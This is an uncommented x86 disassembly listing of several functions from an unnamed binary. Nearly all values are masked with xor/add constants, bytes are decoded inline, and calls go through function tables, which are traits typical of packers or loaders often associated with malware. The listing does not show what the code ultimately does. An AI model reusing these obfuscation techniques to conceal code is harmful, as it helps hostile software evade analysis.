  41ba5d:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ba60:	mov    edx,DWORD PTR [ebp-0x44]
  41ba63:	xor    ecx,ebx
  41ba65:	add    ecx,esi
  41ba67:	imul   ecx,edx
  41ba6a:	mov    edx,DWORD PTR [ebp-0x8]
  41ba6d:	mov    BYTE PTR [ecx+edx*1],al
  41ba70:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba73:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba76:	xor    eax,ebx
  41ba78:	add    eax,esi
  41ba7a:	imul   eax,ecx
  41ba7d:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba80:	mov    al,BYTE PTR [eax+ecx*1]
  41ba83:	mov    BYTE PTR [ebp-0x2],al
  41ba86:	mov    eax,DWORD PTR [ebp-0x1c]
  41ba89:	mov    ecx,DWORD PTR [ebp-0x44]
  41ba8c:	xor    eax,ebx
  41ba8e:	add    eax,esi
  41ba90:	imul   eax,ecx
  41ba93:	mov    ecx,DWORD PTR [ebp-0x34]
  41ba96:	xor    ecx,ebx
  41ba98:	add    eax,ecx
  41ba9a:	mov    ecx,DWORD PTR [ebp-0x8]
  41ba9d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41baa5:	mov    ecx,DWORD PTR [ebp-0xb8]
  41baab:	xor    ecx,ebx
  41baad:	lea    eax,[ecx+eax*1+0x3272e0]
  41bab4:	movzx  ecx,BYTE PTR [ebp-0x2]
  41bab8:	xor    ecx,eax
  41baba:	mov    BYTE PTR [ebp-0x2],cl
  41babd:	mov    al,BYTE PTR [ebp-0x2]
  41bac0:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bac3:	mov    edx,DWORD PTR [ebp-0x44]
  41bac6:	xor    ecx,ebx
  41bac8:	add    ecx,esi
  41baca:	imul   ecx,edx
  41bacd:	mov    edx,DWORD PTR [ebp-0x8]
  41bad0:	mov    BYTE PTR [ecx+edx*1],al
  41bad3:	mov    eax,DWORD PTR [ebp-0x2c]
  41bad6:	mov    ecx,DWORD PTR [ebp-0x34]
  41bad9:	xor    eax,ebx
  41badb:	xor    ecx,ebx
  41badd:	add    eax,esi
  41badf:	add    ecx,esi
  41bae1:	imul   eax,ecx
  41bae4:	add    eax,DWORD PTR [ebp-0x44]
  41bae7:	mov    DWORD PTR [ebp-0x44],eax
  41baea:	mov    eax,DWORD PTR [ebp-0x44]
  41baed:	mov    ecx,DWORD PTR [ebp-0x10]
  41baf0:	cmp    ecx,eax
  41baf2:	jb     0x41b9f6
  41baf8:	mov    eax,DWORD PTR [ebp-0x34]
  41bafb:	mov    ecx,DWORD PTR [ebp-0x10]
  41bafe:	xor    eax,ebx
  41bb00:	add    eax,esi
  41bb02:	imul   eax,ecx
  41bb05:	mov    ecx,DWORD PTR [ebp-0x20]
  41bb08:	xor    ecx,ebx
  41bb0a:	add    ecx,esi
  41bb0c:	or     eax,ecx
  41bb0e:	mov    ecx,DWORD PTR [ebp-0x30]
  41bb11:	xor    ecx,ebx
  41bb13:	add    eax,ecx
  41bb15:	mov    ecx,DWORD PTR [ebp-0x30]
  41bb18:	xor    ecx,ebx
  41bb1a:	add    eax,ecx
  41bb1c:	mov    ecx,DWORD PTR [ebp-0xc]
  41bb1f:	lea    eax,[eax+ecx*1+0x64e5c0]
  41bb26:	jmp    0x41bb37
  41bb28:	mov    eax,DWORD PTR [ebp-0x30]
  41bb2b:	mov    ecx,DWORD PTR [ebp-0xc]
  41bb2e:	xor    eax,ebx
  41bb30:	lea    eax,[eax+ecx*1+0x3272e0]
  41bb37:	mov    DWORD PTR [ebp-0xc],eax
  41bb3a:	mov    eax,DWORD PTR [ebp-0x30]
  41bb3d:	xor    eax,ebx
  41bb3f:	mov    ecx,0xffcd8d20
  41bb44:	sub    ecx,eax
  41bb46:	add    ecx,DWORD PTR [ebp-0x24]
  41bb49:	mov    eax,DWORD PTR [ebp-0x30]
  41bb4c:	mov    edx,DWORD PTR [ebp-0xc]
  41bb4f:	xor    eax,ebx
  41bb51:	add    eax,esi
  41bb53:	imul   eax,edx
  41bb56:	cmp    eax,ecx
  41bb58:	jbe    0x41b96a
  41bb5e:	mov    eax,DWORD PTR [ebp-0x14]
  41bb61:	mov    ecx,DWORD PTR [ebp-0x40]
  41bb64:	mov    eax,DWORD PTR [ebp+0x8]
  41bb67:	mov    edx,DWORD PTR [ebp-0x4c]
  41bb6a:	mov    eax,DWORD PTR [eax+0x1d8]
  41bb70:	xor    edx,ebx
  41bb72:	add    edx,esi
  41bb74:	push   edx
  41bb75:	mov    edx,DWORD PTR [ebp-0x3c]
  41bb78:	xor    edx,ebx
  41bb7a:	add    edx,esi
  41bb7c:	push   edx
  41bb7d:	push   ecx
  41bb7e:	mov    DWORD PTR [ebp-0x2c],ecx
  41bb81:	mov    ecx,DWORD PTR [ebp-0x14]
  41bb84:	xor    ecx,ebx
  41bb86:	add    ecx,esi
  41bb88:	push   ecx
  41bb89:	call   DWORD PTR [eax+0x14]
  41bb8c:	mov    edi,eax
  41bb8e:	mov    eax,DWORD PTR [ebp-0x14]
  41bb91:	xor    eax,ebx
  41bb93:	add    eax,esi
  41bb95:	cmp    eax,edi
  41bb97:	je     0x41bbf2
  41bb99:	mov    eax,DWORD PTR [ebp-0x14]
  41bb9c:	jmp    0x41bbbf
  41bb9e:	mov    ecx,DWORD PTR [ebp-0x28]
  41bba1:	xor    eax,ebx
  41bba3:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e0]
  41bbaa:	mov    BYTE PTR [eax+edi*1+0x3272e0],cl
  41bbb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41bbb4:	xor    ecx,ebx
  41bbb6:	lea    eax,[ecx+eax*1+0x3272e0]
  41bbbd:	xor    eax,ebx
  41bbbf:	mov    ecx,DWORD PTR [ebp-0x40]
  41bbc2:	sub    ecx,esi
  41bbc4:	xor    ecx,ebx
  41bbc6:	cmp    eax,ecx
  41bbc8:	jne    0x41bb9e
  41bbca:	mov    eax,DWORD PTR [ebp+0x8]
  41bbcd:	mov    ecx,DWORD PTR [ebp-0x50]
  41bbd0:	mov    eax,DWORD PTR [eax+0x1d8]
  41bbd6:	xor    ecx,ebx
  41bbd8:	add    ecx,esi
  41bbda:	push   ecx
  41bbdb:	mov    ecx,DWORD PTR [ebp-0x14]
  41bbde:	xor    ecx,ebx
  41bbe0:	add    ecx,esi
  41bbe2:	push   ecx
  41bbe3:	push   DWORD PTR [ebp-0x28]
  41bbe6:	call   DWORD PTR [eax+0x18]
  41bbe9:	mov    eax,DWORD PTR [ebp-0x2c]
  41bbec:	mov    DWORD PTR [ebp-0x28],edi
  41bbef:	mov    DWORD PTR [ebp-0x40],eax
  41bbf2:	mov    edi,DWORD PTR [ebp-0x28]
  41bbf5:	mov    eax,DWORD PTR [ebp-0x18]
  41bbf8:	mov    ecx,DWORD PTR [ebp-0x14]
  41bbfb:	xor    eax,ebx
  41bbfd:	mov    DWORD PTR [ebp-0x2c],edi
  41bc00:	add    eax,esi
  41bc02:	mov    DWORD PTR [ebp-0x5c],0x39122a12
  41bc09:	mov    DWORD PTR [ebp-0x58],0x27123f12
  41bc10:	jmp    0x41bc44
  41bc12:	xor    ecx,ebx
  41bc14:	mov    dl,BYTE PTR [ebp+ecx*1+0x327284]
  41bc1b:	xor    dl,0x73
  41bc1e:	sub    dl,0x9
  41bc21:	mov    DWORD PTR [ebp-0x3c],ecx
  41bc24:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272e0]
  41bc2c:	movzx  edx,dl
  41bc2f:	cmp    ecx,edx
  41bc31:	jne    0x41bc4e
  41bc33:	mov    ecx,DWORD PTR [ebp-0x18]
  41bc36:	mov    edx,DWORD PTR [ebp-0x3c]
  41bc39:	xor    ecx,ebx
  41bc3b:	lea    ecx,[ecx+edx*1+0x3272e0]
  41bc42:	xor    ecx,ebx
  41bc44:	cmp    ecx,0xf89c85b1
  41bc4a:	jne    0x41bc12
  41bc4c:	jmp    0x41bc55
  41bc4e:	mov    eax,DWORD PTR [ebp-0x14]
  41bc51:	xor    eax,ebx
  41bc53:	add    eax,esi
  41bc55:	mov    ecx,DWORD PTR [ebp-0x14]
  41bc58:	xor    ecx,ebx
  41bc5a:	add    ecx,esi
  41bc5c:	cmp    ecx,eax
  41bc5e:	je     0x41bdd1
  41bc64:	mov    eax,DWORD PTR [edi+0x8]
  41bc67:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41bc6e:	mov    DWORD PTR [ebp-0x3c],0xf89cc316
  41bc75:	mov    DWORD PTR [ebp-0x48],0xf89cb5b9
  41bc7c:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41bc83:	mov    DWORD PTR [ebp-0x10],eax
  41bc86:	mov    eax,DWORD PTR [ebp+0x8]
  41bc89:	mov    ecx,DWORD PTR [ebp-0x20]
  41bc8c:	xor    ecx,ebx
  41bc8e:	add    ecx,esi
  41bc90:	push   ecx
  41bc91:	mov    ecx,DWORD PTR [ebp-0x48]
  41bc94:	mov    eax,DWORD PTR [eax+0x1d8]
  41bc9a:	xor    ecx,ebx
  41bc9c:	add    ecx,esi
  41bc9e:	push   ecx
  41bc9f:	mov    ecx,DWORD PTR [ebp-0x3c]
  41bca2:	xor    ecx,ebx
  41bca4:	add    ecx,esi
  41bca6:	push   ecx
  41bca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcaa:	xor    ecx,ebx
  41bcac:	add    ecx,esi
  41bcae:	push   ecx
  41bcaf:	call   DWORD PTR [eax+0x14]
  41bcb2:	mov    edi,eax
  41bcb4:	mov    eax,DWORD PTR [ebp+0x8]
  41bcb7:	mov    ecx,DWORD PTR [ebp-0x20]
  41bcba:	mov    eax,DWORD PTR [eax+0x1d8]
  41bcc0:	xor    ecx,ebx
  41bcc2:	add    ecx,esi
  41bcc4:	push   ecx
  41bcc5:	mov    ecx,DWORD PTR [ebp-0x48]
  41bcc8:	xor    ecx,ebx
  41bcca:	add    ecx,esi
  41bccc:	push   ecx
  41bccd:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcd0:	push   DWORD PTR [ebp-0x10]
  41bcd3:	xor    ecx,ebx
  41bcd5:	add    ecx,esi
  41bcd7:	push   ecx
  41bcd8:	call   DWORD PTR [eax+0x14]
  41bcdb:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcde:	xor    ecx,ebx
  41bce0:	add    ecx,esi
  41bce2:	mov    DWORD PTR [ebp-0x20],eax
  41bce5:	cmp    ecx,edi
  41bce7:	je     0x41c074
  41bced:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcf0:	xor    ecx,ebx
  41bcf2:	add    ecx,esi
  41bcf4:	cmp    ecx,eax
  41bcf6:	je     0x41c074
  41bcfc:	mov    DWORD PTR [ebp-0x3c],0xf89c85ba
  41bd03:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41bd0a:	mov    ecx,DWORD PTR [ebp-0x3c]
  41bd0d:	xor    cl,0x99
  41bd10:	sub    cl,0x20
  41bd13:	mov    BYTE PTR [edi],cl
  41bd15:	mov    ecx,DWORD PTR [ebp-0xc]
  41bd18:	xor    cl,0x99
  41bd1b:	sub    cl,0x20
  41bd1e:	mov    BYTE PTR [edi+0x1],cl
  41bd21:	mov    ecx,DWORD PTR [ebp-0x4c]
  41bd24:	xor    cl,0x99
  41bd27:	sub    cl,0x20
  41bd2a:	mov    BYTE PTR [edi+0x2],cl
  41bd2d:	and    DWORD PTR [ebp-0xb4],0x0
  41bd34:	and    DWORD PTR [ebp-0xa4],0x0
  41bd3b:	lea    ecx,[ebp-0xa4]
  41bd41:	push   ecx
  41bd42:	push   DWORD PTR [ebp-0x10]
  41bd45:	push   eax
  41bd46:	lea    eax,[ebp-0xb4]
  41bd4c:	push   eax
  41bd4d:	mov    eax,DWORD PTR [ebp-0x2c]
  41bd50:	push   DWORD PTR [eax+0xc]
  41bd53:	mov    eax,DWORD PTR [ebp-0x28]
  41bd56:	add    eax,0x10
  41bd59:	push   eax
  41bd5a:	push   edi
  41bd5b:	call   0x41b0a7
  41bd60:	mov    DWORD PTR [ebp-0x3c],eax
  41bd63:	mov    eax,DWORD PTR [ebp+0x8]
  41bd66:	mov    ecx,DWORD PTR [ebp-0x50]
  41bd69:	mov    eax,DWORD PTR [eax+0x1d8]
  41bd6f:	xor    ecx,ebx
  41bd71:	add    ecx,esi
  41bd73:	push   ecx
  41bd74:	mov    ecx,DWORD PTR [ebp-0xc]
  41bd77:	xor    ecx,ebx
  41bd79:	add    ecx,esi
  41bd7b:	push   ecx
  41bd7c:	push   edi
  41bd7d:	call   DWORD PTR [eax+0x18]
  41bd80:	mov    eax,DWORD PTR [ebp-0x3c]
  41bd83:	add    eax,0xffcd8d20
  41bd88:	xor    eax,ebx
  41bd8a:	cmp    eax,0xf89c85b9
  41bd8f:	mov    eax,DWORD PTR [ebp+0x8]
  41bd92:	mov    eax,DWORD PTR [eax+0x1d8]
  41bd98:	mov    ecx,DWORD PTR [ebp-0x50]
  41bd9b:	jne    0x41bdbe
  41bd9d:	xor    ecx,ebx
  41bd9f:	add    ecx,esi
  41bda1:	push   ecx
  41bda2:	mov    ecx,DWORD PTR [ebp-0xc]
  41bda5:	xor    ecx,ebx
  41bda7:	add    ecx,esi
  41bda9:	push   ecx
  41bdaa:	push   DWORD PTR [ebp-0x28]
  41bdad:	call   DWORD PTR [eax+0x18]
  41bdb0:	mov    eax,DWORD PTR [ebp-0x20]
  41bdb3:	mov    DWORD PTR [ebp-0x28],eax
  41bdb6:	mov    eax,DWORD PTR [ebp-0x10]
  41bdb9:	mov    DWORD PTR [ebp-0x40],eax
  41bdbc:	jmp    0x41bdd1
  41bdbe:	xor    ecx,ebx
  41bdc0:	add    ecx,esi
  41bdc2:	push   ecx
  41bdc3:	mov    ecx,DWORD PTR [ebp-0xc]
  41bdc6:	xor    ecx,ebx
  41bdc8:	add    ecx,esi
  41bdca:	push   ecx
  41bdcb:	push   DWORD PTR [ebp-0x20]
  41bdce:	call   DWORD PTR [eax+0x18]
  41bdd1:	mov    eax,DWORD PTR [ebp-0x40]
  41bdd4:	mov    DWORD PTR [ebp-0x38],eax
  41bdd7:	mov    eax,DWORD PTR [ebp-0x28]
  41bdda:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41bde1:	mov    DWORD PTR [ebp-0x3c],eax
  41bde4:	mov    edi,0xf89c85b8
  41bde9:	mov    DWORD PTR [ebp-0x30],edi
  41bdec:	mov    eax,DWORD PTR [ebp-0x24]
  41bdef:	xor    eax,ebx
  41bdf1:	add    eax,esi
  41bdf3:	mov    DWORD PTR [ebp-0xc],eax
  41bdf6:	mov    eax,DWORD PTR [ebp-0x24]
  41bdf9:	xor    eax,ebx
  41bdfb:	add    eax,esi
  41bdfd:	mov    DWORD PTR [ebp-0x10],eax
  41be00:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  41be07:	mov    DWORD PTR [ebp-0x20],0xf89c85be
  41be0e:	mov    eax,DWORD PTR [ebp-0x24]
  41be11:	mov    ecx,DWORD PTR [ebp-0x38]
  41be14:	xor    eax,ebx
  41be16:	add    eax,esi
  41be18:	cmp    ecx,eax
  41be1a:	je     0x41c010
  41be20:	jmp    0x41bfec
  41be25:	mov    ecx,DWORD PTR [ebp-0xc]
  41be28:	mov    eax,DWORD PTR [ebp-0x38]
  41be2b:	sub    eax,ecx
  41be2d:	mov    ecx,DWORD PTR [ebp-0x48]
  41be30:	xor    ecx,ebx
  41be32:	add    ecx,esi
  41be34:	xor    edx,edx
  41be36:	div    ecx
  41be38:	mov    DWORD PTR [ebp-0x10],eax
  41be3b:	mov    eax,DWORD PTR [ebp-0x20]
  41be3e:	mov    ecx,DWORD PTR [ebp-0x10]
  41be41:	xor    eax,ebx
  41be43:	add    eax,esi
  41be45:	cmp    ecx,eax
  41be47:	jbe    0x41be53
  41be49:	mov    eax,DWORD PTR [ebp-0x20]
  41be4c:	xor    eax,ebx
  41be4e:	add    eax,esi
  41be50:	mov    DWORD PTR [ebp-0x10],eax
  41be53:	mov    eax,DWORD PTR [ebp-0x48]
  41be56:	mov    ecx,DWORD PTR [ebp-0x10]
  41be59:	xor    eax,ebx
  41be5b:	add    eax,esi
  41be5d:	imul   eax,ecx
  41be60:	mov    DWORD PTR [ebp-0x10],eax
  41be63:	mov    eax,DWORD PTR [ebp-0x24]
  41be66:	mov    ecx,DWORD PTR [ebp-0x10]
  41be69:	xor    eax,ebx
  41be6b:	add    eax,esi
  41be6d:	cmp    ecx,eax
  41be6f:	je     0x41bfda
  41be75:	mov    eax,DWORD PTR [ebp-0x10]
  41be78:	mov    DWORD PTR [ebp-0x34],eax
  41be7b:	mov    eax,DWORD PTR [ebp-0xc]
  41be7e:	add    eax,DWORD PTR [ebp-0x3c]
  41be81:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  41be88:	mov    DWORD PTR [ebp-0x10],edi
  41be8b:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41be92:	mov    DWORD PTR [ebp-0x1c],eax
  41be95:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  41be9c:	mov    DWORD PTR [ebp-0x8],edi
  41be9f:	mov    eax,DWORD PTR [ebp-0x54]
  41bea2:	xor    eax,ebx
  41bea4:	add    eax,esi
  41bea6:	jmp    0x41bf99
  41beab:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41beb5:	mov    DWORD PTR [ebp-0x9c],0xf89c85ad
  41bebf:	mov    eax,DWORD PTR [ebp-0x8]
  41bec2:	mov    ecx,DWORD PTR [ebp-0x18]
  41bec5:	xor    eax,ebx
  41bec7:	add    eax,esi
  41bec9:	imul   eax,ecx
  41becc:	mov    ecx,DWORD PTR [ebp-0x1c]
  41becf:	mov    al,BYTE PTR [eax+ecx*1]
  41bed2:	mov    BYTE PTR [ebp-0x1],al
  41bed5:	mov    eax,DWORD PTR [ebp-0x8]
  41bed8:	mov    ecx,DWORD PTR [ebp-0x18]
  41bedb:	xor    eax,ebx
  41bedd:	add    eax,esi
  41bedf:	imul   eax,ecx
  41bee2:	mov    ecx,DWORD PTR [ebp-0x4c]
  41bee5:	xor    ecx,ebx
  41bee7:	add    eax,ecx
  41bee9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41beec:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41bef4:	mov    ecx,DWORD PTR [ebp-0xac]
  41befa:	xor    ecx,ebx
  41befc:	lea    eax,[ecx+eax*1+0x3272e0]
  41bf03:	movzx  ecx,BYTE PTR [ebp-0x1]
  41bf07:	xor    ecx,eax
  41bf09:	mov    BYTE PTR [ebp-0x1],cl
  41bf0c:	mov    al,BYTE PTR [ebp-0x1]
  41bf0f:	mov    ecx,DWORD PTR [ebp-0x8]
  41bf12:	mov    edx,DWORD PTR [ebp-0x18]
  41bf15:	xor    ecx,ebx
  41bf17:	add    ecx,esi
  41bf19:	imul   ecx,edx
  41bf1c:	mov    edx,DWORD PTR [ebp-0x1c]
  41bf1f:	mov    BYTE PTR [ecx+edx*1],al
  41bf22:	mov    eax,DWORD PTR [ebp-0x8]
  41bf25:	mov    ecx,DWORD PTR [ebp-0x18]
  41bf28:	xor    eax,ebx
  41bf2a:	add    eax,esi
  41bf2c:	imul   eax,ecx
  41bf2f:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bf32:	mov    al,BYTE PTR [eax+ecx*1]
  41bf35:	mov    BYTE PTR [ebp-0x1],al
  41bf38:	mov    eax,DWORD PTR [ebp-0x8]
  41bf3b:	mov    ecx,DWORD PTR [ebp-0x18]
  41bf3e:	xor    eax,ebx
  41bf40:	add    eax,esi
  41bf42:	imul   eax,ecx
  41bf45:	mov    ecx,DWORD PTR [ebp-0x10]
  41bf48:	xor    ecx,ebx
  41bf4a:	add    eax,ecx
  41bf4c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bf4f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41bf57:	mov    ecx,DWORD PTR [ebp-0x9c]
  41bf5d:	xor    ecx,ebx
  41bf5f:	lea    eax,[ecx+eax*1+0x3272e0]
  41bf66:	movzx  ecx,BYTE PTR [ebp-0x1]
  41bf6a:	xor    ecx,eax
  41bf6c:	mov    BYTE PTR [ebp-0x1],cl
  41bf6f:	mov    al,BYTE PTR [ebp-0x1]
  41bf72:	mov    ecx,DWORD PTR [ebp-0x8]
  41bf75:	mov    edx,DWORD PTR [ebp-0x18]
  41bf78:	xor    ecx,ebx
  41bf7a:	add    ecx,esi
  41bf7c:	imul   ecx,edx
  41bf7f:	mov    edx,DWORD PTR [ebp-0x1c]
  41bf82:	mov    BYTE PTR [ecx+edx*1],al
  41bf85:	mov    eax,DWORD PTR [ebp-0x2c]
  41bf88:	mov    ecx,DWORD PTR [ebp-0x10]
  41bf8b:	xor    eax,ebx
  41bf8d:	xor    ecx,ebx
  41bf8f:	add    eax,esi
  41bf91:	add    ecx,esi
  41bf93:	imul   eax,ecx
  41bf96:	add    eax,DWORD PTR [ebp-0x18]
  41bf99:	mov    DWORD PTR [ebp-0x18],eax
  41bf9c:	mov    eax,DWORD PTR [ebp-0x18]
  41bf9f:	mov    ecx,DWORD PTR [ebp-0x34]
  41bfa2:	cmp    ecx,eax
  41bfa4:	jb     0x41beab
  41bfaa:	mov    eax,DWORD PTR [ebp-0x10]
  41bfad:	mov    ecx,DWORD PTR [ebp-0x34]
  41bfb0:	xor    eax,ebx
  41bfb2:	add    eax,esi
  41bfb4:	imul   eax,ecx
  41bfb7:	mov    ecx,DWORD PTR [ebp-0x54]
  41bfba:	xor    ecx,ebx
  41bfbc:	add    ecx,esi
  41bfbe:	or     eax,ecx
  41bfc0:	mov    ecx,DWORD PTR [ebp-0x30]
  41bfc3:	xor    ecx,ebx
  41bfc5:	add    eax,ecx
  41bfc7:	mov    ecx,DWORD PTR [ebp-0x30]
  41bfca:	xor    ecx,ebx
  41bfcc:	add    eax,ecx
  41bfce:	mov    ecx,DWORD PTR [ebp-0xc]
  41bfd1:	lea    eax,[eax+ecx*1+0x64e5c0]
  41bfd8:	jmp    0x41bfe9
  41bfda:	mov    eax,DWORD PTR [ebp-0x30]
  41bfdd:	mov    ecx,DWORD PTR [ebp-0xc]
  41bfe0:	xor    eax,ebx
  41bfe2:	lea    eax,[eax+ecx*1+0x3272e0]
  41bfe9:	mov    DWORD PTR [ebp-0xc],eax
  41bfec:	mov    eax,DWORD PTR [ebp-0x30]
  41bfef:	xor    eax,ebx
  41bff1:	mov    ecx,0xffcd8d20
  41bff6:	sub    ecx,eax
  41bff8:	add    ecx,DWORD PTR [ebp-0x38]
  41bffb:	mov    eax,DWORD PTR [ebp-0x30]
  41bffe:	mov    edx,DWORD PTR [ebp-0xc]
  41c001:	xor    eax,ebx
  41c003:	add    eax,esi
  41c005:	imul   eax,edx
  41c008:	cmp    eax,ecx
  41c00a:	jbe    0x41be25
  41c010:	push   DWORD PTR [ebp+0x8]
  41c013:	mov    eax,DWORD PTR [ebp+0x8]
  41c016:	push   DWORD PTR [eax+0x1cc]
  41c01c:	lea    eax,[ebp-0xa0]
  41c022:	push   eax
  41c023:	mov    eax,DWORD PTR [ebp+0x8]
  41c026:	mov    eax,DWORD PTR [eax+0x1c4]
  41c02c:	push   DWORD PTR [eax]
  41c02e:	mov    eax,DWORD PTR [ebp+0x8]
  41c031:	mov    eax,DWORD PTR [eax+0x1c0]
  41c037:	push   DWORD PTR [eax]
  41c039:	push   DWORD PTR [ebp-0x40]
  41c03c:	push   DWORD PTR [ebp-0x28]
  41c03f:	call   0x41cad6
  41c044:	mov    DWORD PTR [ebp-0x3c],eax
  41c047:	mov    eax,DWORD PTR [ebp-0x14]
  41c04a:	mov    ecx,DWORD PTR [ebp-0x28]
  41c04d:	xor    eax,ebx
  41c04f:	add    eax,esi
  41c051:	cmp    eax,ecx
  41c053:	je     0x41c074
  41c055:	mov    eax,DWORD PTR [ebp+0x8]
  41c058:	mov    ecx,DWORD PTR [ebp-0x50]
  41c05b:	mov    eax,DWORD PTR [eax+0x1d8]
  41c061:	xor    ecx,ebx
  41c063:	add    ecx,esi
  41c065:	push   ecx
  41c066:	mov    ecx,DWORD PTR [ebp-0x14]
  41c069:	xor    ecx,ebx
  41c06b:	add    ecx,esi
  41c06d:	push   ecx
  41c06e:	push   DWORD PTR [ebp-0x28]
  41c071:	call   DWORD PTR [eax+0x18]
  41c074:	pop    edi
  41c075:	pop    esi
  41c076:	pop    ebx
  41c077:	leave  
  41c078:	ret    0x4
  41c07b:	push   ebp
  41c07c:	mov    ebp,esp
  41c07e:	push   ecx
  41c07f:	push   ecx
  41c080:	lea    eax,[ebp-0x8]
  41c083:	mov    DWORD PTR [ebp-0x4],eax
  41c086:	push   esi
  41c087:	mov    esi,DWORD PTR [ebp-0x4]
  41c08a:	mov    eax,0xf881ba0f
  41c08f:	mov    DWORD PTR [esi],eax
  41c091:	mov    esi,DWORD PTR [ebp-0x8]
  41c094:	cmp    esi,eax
  41c096:	pop    esi
  41c097:	jne    0x41c0a1
  41c099:	mov    BYTE PTR [ecx+0xa],0x7a
  41c09d:	mov    BYTE PTR [edx+0x8],0x2f
  41c0a1:	mov    BYTE PTR [edx+0xa],0x7a
  41c0a5:	mov    BYTE PTR [ecx+0x2],0x4
  41c0a9:	leave  
  41c0aa:	ret    
  41c0ab:	push   ebp
  41c0ac:	mov    ebp,esp
  41c0ae:	push   ecx
  41c0af:	push   ecx
  41c0b0:	lea    eax,[ebp-0x8]
  41c0b3:	mov    DWORD PTR [ebp-0x4],eax
  41c0b6:	mov    edx,DWORD PTR [ebp-0x4]
  41c0b9:	mov    eax,0xf88b0be3
  41c0be:	mov    DWORD PTR [edx],eax
  41c0c0:	mov    edx,DWORD PTR [ebp-0x8]
  41c0c3:	cmp    edx,eax
  41c0c5:	jne    0x41c0d6
  41c0c7:	mov    eax,DWORD PTR [ebp+0x8]
  41c0ca:	mov    BYTE PTR [ecx+0x9],0xe
  41c0ce:	mov    BYTE PTR [eax+0x7],0x47
  41c0d2:	mov    BYTE PTR [ecx+0x6],0xf
  41c0d6:	mov    BYTE PTR [ecx+0x3],0x1e
  41c0da:	leave  
  41c0db:	ret    0x4
  41c0de:	push   ebp
  41c0df:	mov    ebp,esp
  41c0e1:	push   ecx
  41c0e2:	push   ecx
  41c0e3:	lea    eax,[ebp-0x8]
  41c0e6:	mov    DWORD PTR [ebp-0x4],eax
  41c0e9:	mov    edx,DWORD PTR [ebp-0x4]
  41c0ec:	mov    eax,0x7e0da0f
  41c0f1:	mov    DWORD PTR [edx],eax
  41c0f3:	mov    edx,DWORD PTR [ebp-0x8]
  41c0f6:	cmp    edx,eax
  41c0f8:	jne    0x41c0fe
  41c0fa:	mov    BYTE PTR [ecx+0x7],0x47
  41c0fe:	mov    eax,DWORD PTR [ebp+0x8]
  41c101:	mov    BYTE PTR [ecx+0x1],0x1
  41c105:	mov    BYTE PTR [eax+0x9],0x2e
  41c109:	leave  
  41c10a:	ret    0x4
  41c10d:	push   ebp
  41c10e:	mov    ebp,esp
  41c110:	push   ecx
  41c111:	push   ecx
  41c112:	lea    eax,[ebp-0x8]
  41c115:	mov    DWORD PTR [ebp-0x4],eax
  41c118:	push   esi
  41c119:	mov    esi,DWORD PTR [ebp-0x4]
  41c11c:	mov    eax,0x7060e3e
  41c121:	mov    DWORD PTR [esi],eax
  41c123:	mov    esi,DWORD PTR [ebp-0x8]
  41c126:	cmp    esi,eax
  41c128:	pop    esi
  41c129:	jne    0x41c135
  41c12b:	mov    BYTE PTR [edx+0x4],0xb
  41c12f:	mov    WORD PTR [ecx+0x3],0xb1e
  41c135:	mov    BYTE PTR [edx],0x3f
  41c138:	leave  
  41c139:	ret    
  41c13a:	push   ebp
  41c13b:	mov    ebp,esp
  41c13d:	push   ecx
  41c13e:	push   ecx
  41c13f:	lea    eax,[ebp-0x8]
  41c142:	mov    DWORD PTR [ebp-0x4],eax
  41c145:	mov    edx,DWORD PTR [ebp-0x4]
  41c148:	mov    eax,0xf8870b3f
  41c14d:	mov    DWORD PTR [edx],eax
  41c14f:	mov    edx,DWORD PTR [ebp-0x8]
  41c152:	cmp    edx,eax
  41c154:	jne    0x41c161
  41c156:	mov    eax,DWORD PTR [ebp+0x8]
  41c159:	mov    BYTE PTR [ecx+0x8],0xf
  41c15d:	mov    BYTE PTR [eax+0x1],0x1
  41c161:	mov    BYTE PTR [ecx+0x5],0xf3
  41c165:	leave  
  41c166:	ret    0x4
  41c169:	push   esi
  41c16a:	mov    ecx,edi
  41c16c:	call   0x41c13a
  41c171:	mov    edx,edi
  41c173:	mov    ecx,esi
  41c175:	mov    BYTE PTR [esi],0x1f
  41c178:	call   0x41c10d
  41c17d:	push   esi
  41c17e:	mov    ecx,edi
  41c180:	mov    BYTE PTR [esi+0x5],0xf3
  41c184:	call   0x41c0de
  41c189:	push   esi
  41c18a:	mov    BYTE PTR [esi+0x6],0xf
  41c18e:	call   0x41c0ab
  41c193:	mov    BYTE PTR [esi+0x2],0x4
  41c197:	mov    edx,esi
  41c199:	jmp    0x41c07b
  41c19e:	push   ebp
  41c19f:	mov    ebp,esp
  41c1a1:	push   ecx
  41c1a2:	mov    ecx,DWORD PTR [edx+0x194]
  41c1a8:	push   esi
  41c1a9:	mov    esi,DWORD PTR [ebp+0x8]
  41c1ac:	mov    esi,DWORD PTR [esi]
  41c1ae:	mov    DWORD PTR [ecx],esi
  41c1b0:	mov    ecx,DWORD PTR [edx+0x194]
  41c1b6:	mov    ecx,DWORD PTR [ecx]
  41c1b8:	mov    esi,DWORD PTR [edx+0x190]
  41c1be:	mov    DWORD PTR [esi],ecx
  41c1c0:	mov    eax,DWORD PTR [edx+0x194]
